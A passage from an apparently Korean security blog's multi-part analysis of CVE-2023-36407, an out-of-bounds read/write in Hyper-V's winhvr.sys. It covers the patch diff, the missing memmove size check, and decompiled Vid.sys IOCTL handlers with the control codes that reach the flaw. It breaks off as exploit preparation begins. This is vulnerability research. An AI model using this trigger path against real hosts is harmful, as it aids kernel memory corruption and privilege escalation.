&lt;p&gt;&amp;#xD328;&amp;#xCE58;&amp;#xB418;&amp;#xBA74;&amp;#xC11C; &amp;#xC0AD;&amp;#xC81C;&amp;#xB41C; &lt;code&gt;WinHvpSetupVpStatePfnBuffer&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xD638;&amp;#xCD9C;(&amp;#xC67C;&amp;#xCABD;, Line 30)&amp;#xC774; &amp;#xC0AC;&amp;#xB77C;&amp;#xC9C0;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xB2E4;&amp;#xB978; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xB300;&amp;#xCCB4;&amp;#xD55C; &amp;#xAC83;&amp;#xACFC; &lt;code&gt;memmove&lt;/code&gt;&amp;#xC758; &amp;#xC138; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xC778; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xAE38;&amp;#xC774; + 0x28&amp;#xC774; 0x1000&amp;#xBCF4;&amp;#xB2E4; &amp;#xD070;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;(&amp;#xC624;&amp;#xB978;&amp;#xCABD;, Line 39)&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WinHvGetVpState&lt;/code&gt; &amp;#xB610;&amp;#xD55C; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xD328;&amp;#xCE58;&amp;#xAC00; &amp;#xC801;&amp;#xC6A9;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image5.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image5.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xC0AD;&amp;#xC81C;&amp;#xB41C; &lt;code&gt;WinHvpSetupVpStatePfnBuffer&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xB370;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image6.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ExAllocatePool2&lt;/code&gt;&amp;#xC640; &lt;code&gt;MmGetPhysicalAddress&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xACFC; &amp;#xB2E4;&amp;#xB978; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xC544; &amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC0AD;&amp;#xC81C;&amp;#xB418;&amp;#xACE0; &amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xC640; &amp;#xC644;&amp;#xC804; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xCD94;&amp;#xC815;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xC544;&amp;#xB9C8; &amp;#xB2E4;&amp;#xB978; &amp;#xACF3;&amp;#xC5D0;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0;&amp;#xB3C4; &amp;#xC54A;&amp;#xACE0; &amp;#xD568;&amp;#xC218;&amp;#xB85C;&amp;#xC11C;&amp;#xC758; &amp;#xC758;&amp;#xBBF8;&amp;#xAC00; &amp;#xD1F4;&amp;#xC0C9;&amp;#xB418;&amp;#xC5B4; &amp;#xC0AC;&amp;#xB77C;&amp;#xC9C4;&amp;#xAC8C; &amp;#xC544;&amp;#xB2D0;&amp;#xAE4C; &amp;#xC870;&amp;#xC2EC;&amp;#xC2A4;&amp;#xB808; &amp;#xCD94;&amp;#xCE21;&amp;#xD574;&amp;#xBD05;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026;&lt;/p&gt;
&lt;h1 id=&#34;Vulnerability&#34;&gt;&lt;a href=&#34;#Vulnerability&#34; class=&#34;headerlink&#34; title=&#34;Vulnerability&#34;&gt;&lt;/a&gt;Vulnerability&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xC790;&amp;#xBA74; CVE-2023-36407&amp;#xC740; &lt;code&gt;winhvr.sys&lt;/code&gt;&amp;#xC758; &lt;code&gt;WinHvGetVpState&lt;/code&gt;&amp;#xC640; &lt;code&gt;WinHvSetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;memove&lt;/code&gt;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &lt;code&gt;Size&lt;/code&gt; &amp;#xAC12;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC80;&amp;#xC0AC;&amp;#xAC00; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; OOB Read/Write &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &lt;code&gt;WinHvGetVpState&lt;/code&gt;&amp;#xB85C; OOB Read&amp;#xB97C; &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xB85C; OOB Write&amp;#xB97C; &amp;#xC218;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xBC84;&amp;#xD37C;&amp;#xB294; &lt;code&gt;&amp;quot;WHvJ&amp;quot;&lt;/code&gt; &amp;#xD0DC;&amp;#xADF8;&amp;#xB85C; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; 0x1000 &amp;#xD06C;&amp;#xAE30;&amp;#xC758; Non-paged Pool&amp;#xB85C; Hypercall&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xBC84;&amp;#xD37C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; &amp;#xC774;&amp;#xB984;&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xAC00;&amp;#xC0C1; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC11C;(Virtual Processor)&amp;#xC758; &amp;#xC0C1;&amp;#xD0DC;(State)&amp;#xB97C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;Triggering-the-Bug&#34;&gt;&lt;a href=&#34;#Triggering-the-Bug&#34; class=&#34;headerlink&#34; title=&#34;Triggering the Bug&#34;&gt;&lt;/a&gt;Triggering the Bug&lt;/h1&gt;&lt;p&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;&amp;#xB294; &amp;#xBA3C;&amp;#xC800; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xC54C; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC740; &lt;code&gt;winhvr.sys&lt;/code&gt; &amp;#xB0B4;&amp;#xBD80;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; Export&amp;#xB418;&amp;#xACE0; &amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; Virtualization Infrastructure Driver(&lt;code&gt;Vid.sys&lt;/code&gt;)&amp;#xC5D0;&amp;#xC11C; Import&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;Vid-VidExoIoControlPartition&#34;&gt;&lt;a href=&#34;#Vid-VidExoIoControlPartition&#34; class=&#34;headerlink&#34; title=&#34;Vid!VidExoIoControlPartition&#34;&gt;&lt;/a&gt;Vid!VidExoIoControlPartition&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Vid.sys&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;WinHvGetVpState&lt;/code&gt;&amp;#xC640; &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xC774;&amp;#xB984;&amp;#xC5D0;&amp;#xC11C; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; I/O Control&amp;#xC744; &amp;#xCC98;&amp;#xB9AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;VidExoIoControlPartition&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;ulonglong VidExoIoControlPartition
                    (undefined (*param_1) [&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;],_IRP *param_2,ulonglong *FileObject,&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *InputBuffer
                    ,uint InputBufferLength,&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *OutputBuffer,uint OutputBufferLength,
                    uint ControlCode,uint *param_9)

{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar1;
  ulonglong uVar2;
  undefined4 extraout_var;
  undefined4 extraout_var_00;
  
  *param_9 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (ControlCode == &lt;span class=&#34;hljs-number&#34;&gt;0x221278&lt;/span&gt;) {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (InputBufferLength &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;) {
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
    }
                    &lt;span class=&#34;hljs-comment&#34;&gt;/* WARNING: Load size is inaccurate */&lt;/span&gt;
    uVar2 = WinHvInstallIntercept
                      (*(undefined8 *)(param_1[&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;] + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;),*InputBuffer,(longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;);
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;0x221198&lt;/span&gt; &amp;lt; ControlCode) {
    &lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt;(ControlCode) {
	&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&amp;apos;&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x221264&lt;/span&gt;:
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (InputBufferLength &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (OutputBufferLength == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;0x1fb000&lt;/span&gt; &amp;lt; OutputBufferLength) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x80000005&lt;/span&gt;;
      }
                    &lt;span class=&#34;hljs-comment&#34;&gt;/* WARNING: Load size is inaccurate */&lt;/span&gt;
      uVar2 = WinHvGetVpState(*(undefined8 *)(param_1[&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;] + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;),*InputBuffer,
                              *(undefined *)((longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;),(longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;,
                              OutputBuffer,OutputBufferLength);
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt; &amp;lt; (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)uVar2) {
        *param_9 = OutputBufferLength;
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
    &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x221268&lt;/span&gt;:
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (InputBufferLength &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;0x21&lt;/span&gt;) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0xc0000023&lt;/span&gt;;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-number&#34;&gt;0x1fb000&lt;/span&gt; &amp;lt; InputBufferLength - &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x80000005&lt;/span&gt;;
      }
                    &lt;span class=&#34;hljs-comment&#34;&gt;/* WARNING: Load size is inaccurate */&lt;/span&gt;
      uVar2 = WinHvSetVpState(*(undefined8 *)(param_1[&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;] + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;),*InputBuffer,
                              *(undefined *)((longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;),(longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;,
                              (longlong)InputBuffer + &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;,InputBufferLength - &lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;);
      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
	  ...
	}
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar2;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;control code&amp;#xAC00; &amp;#xAC01;&amp;#xAC01; 0x221264, 0x221268&amp;#xC77C; &amp;#xB54C; &lt;code&gt;WinHvGetVpState&lt;/code&gt;, &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;\Device\VidExo&lt;/code&gt; &amp;#xB514;&amp;#xBC14;&amp;#xC774;&amp;#xC2A4;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; I/O Control&amp;#xC740; &lt;code&gt;VidExopIoControlPreProcess&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; &amp;#xC774;&amp;#xC5B4;&amp;#xC838; &lt;code&gt;VidExoIoControlDriver&lt;/code&gt;, &lt;code&gt;VidExoIoControlPartition&lt;/code&gt;, &lt;code&gt;VidIoControlDriver&lt;/code&gt;, &lt;code&gt;VidIoControlPartition&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xC911; &amp;#xD558;&amp;#xB098;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image7.png&#34; alt=&#34;newjeans-hyper-v-pt7/newjeans-hyper-v-pt7image7.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;VidExopIoControlPreProcess&#34;&gt;&lt;a href=&#34;#VidExopIoControlPreProcess&#34; class=&#34;headerlink&#34; title=&#34;VidExopIoControlPreProcess&#34;&gt;&lt;/a&gt;&lt;code&gt;VidExopIoControlPreProcess&lt;/code&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;__int64 __fastcall &lt;span class=&#34;hljs-title&#34;&gt;VidExopIoControlPreProcess&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(__int64 a1, IRP *irp)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  a8[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  CurStackLocation = irp-&amp;gt;Tail.Overlay.CurrentStackLocation;
  CTL_CODE = CurStackLocation-&amp;gt;Parameters.DeviceIoControl.IoControlCode;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( (CTL_CODE &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
  {
    InputLength = CurStackLocation-&amp;gt;Parameters.DeviceIoControl.InputBufferLength;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( InputLength )
      InputBuffer = irp-&amp;gt;AssociatedIrp.SystemBuffer;
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      InputBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    OutputLength = CurStackLocation-&amp;gt;Parameters.DeviceIoControl.OutputBufferLength;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( OutputLength )
      OutputBuffer = irp-&amp;gt;AssociatedIrp.SystemBuffer;
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
      OutputBuffer = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;i64;
    FileObj = CurStackLocation-&amp;gt;FileObject;
    v11 = (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int64)FileObj-&amp;gt;FsContext;
    fscontext = v11 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64;&lt;span class=&#34;hljs-comment&#34;&gt;// *(DWORD*)fscontext == &amp;apos; oxE&amp;apos;&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( fscontext )
    {
      if ( *(_DWORD *)fscontext != &amp;apos; oxE&amp;apos; )
      {
        if ( *(_DWORD *)fscontext != &amp;apos;ntrP&amp;apos; )
        {
          v5 = &lt;span class=&#34;hljs-number&#34;&gt;-1073741816&lt;/span&gt;;
          &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_3;
        }
        ...
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( _bittest64(&amp;amp;v16, &lt;span class=&#34;hljs-number&#34;&gt;0xF&lt;/span&gt;u) )
          v17 = VidExoIoControlPartition((_QWORD *)fscontext,irp,FileObj,InputBuffer,InputLength,OutputBuffer,OutputLength,CTL_CODE,(__int64)a8);
        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
          ...
      }
      v20 = VidExoIoControlDriver(v13, v12, InputBuffer, InputLength, OutputBuffer, OutputLength, CTL_CODE, a8);
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      v20 = VidIoControlDriver((__int64)VidDeviceExtension,(__int64)FileObj,InputBuffer,InputLength,OutputBuffer,OutputLength,CTL_CODE,a8);
    }
   ...
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; v5;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;Exo-Partition&#34;&gt;&lt;a href=&#34;#Exo-Partition&#34; class=&#34;headerlink&#34; title=&#34;Exo Partition&#34;&gt;&lt;/a&gt;Exo Partition&lt;/h2&gt;&lt;p&gt;&amp;#xBC14;&amp;#xB85C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xB7EC; &amp;#xAC00;&amp;#xBCF4;&amp;#xAE30; &amp;#xC804;&amp;#xC5D0; Exo Partition&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xC54C; &amp;#xD544;&amp;#xC694;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB514;&amp;#xBC14;&amp;#xC774;&amp;#xC2A4; &amp;#xC774;&amp;#xB984;&amp;#xC774;&amp;#xB098; &amp;#xD568;&amp;#xC218;&amp;#xBA85;&amp;#xC5D0;&amp;#xC11C; &amp;#xACC4;&amp;#xC18D; &amp;#xBCF4;&amp;#xC774;&amp;#xB294; &lt;code&gt;Exo&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xB2E8;&amp;#xC5B4;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xB514;&amp;#xBC14;&amp;#xC774;&amp;#xC2A4;&amp;#xC640; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC774; Exo Partition&amp;#xACFC; &amp;#xC5F0;&amp;#xAD00;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC778;&amp;#xB370;&amp;#xC694;? &amp;#xC774; Exo Partition&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xAC74; &amp;#xD55C;&amp;#xB9C8;&amp;#xB514;&amp;#xB85C; WHVP(Windows Hypervisor Platform) API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xAD00;&amp;#xB9AC;&amp;#xB418;&amp;#xB294; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;&amp;#xC744; &amp;#xB9D0;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;! WHVP API&amp;#xAC00; &amp;#xC81C;&amp;#xACF5;&amp;#xD558;&amp;#xB294; &lt;code&gt;WHvCreatePartition&lt;/code&gt;, &lt;code&gt;WHvCreateVirtualProcessor&lt;/code&gt; &amp;#xB4F1;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; Hyper-V&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;/&amp;#xAC00;&amp;#xC0C1; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC11C;&amp;#xC758; &amp;#xC0DD;&amp;#xC131;&amp;#xACFC; &amp;#xAD00;&amp;#xB9AC; &amp;#xB4F1;&amp;#xC774; &amp;#xAC00;&amp;#xB2A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; WHVP API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; Partition &amp;#xC0DD;&amp;#xC131;/&amp;#xC81C;&amp;#xAC70;&amp;#xB97C; &amp;#xD558;&amp;#xB294; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC2DC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;WinHvPlatform.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; size, val;
